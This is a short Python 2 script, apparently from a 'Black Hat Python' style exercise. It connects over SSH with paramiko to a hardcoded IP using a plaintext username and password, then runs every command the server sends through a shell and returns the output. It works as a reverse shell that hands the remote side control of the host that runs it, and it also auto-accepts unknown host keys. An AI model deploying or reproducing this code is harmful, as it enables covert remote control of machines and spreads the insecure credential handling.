
import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('/home/aaron/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username = user, password = passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print ssh_session.recv(1024) #get hello message
        while True:
            command = ssh_session.recv(1024)# get command from ssh server
            try:
                #this part can be compared with "run_command()" in bhpServer.py
                #that one seems better
                cmd_output=subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
            
        client.close()
                
    return 

ssh_command('172.17.28.197', 'aaron', 'arera88', 'ClientConnected')

    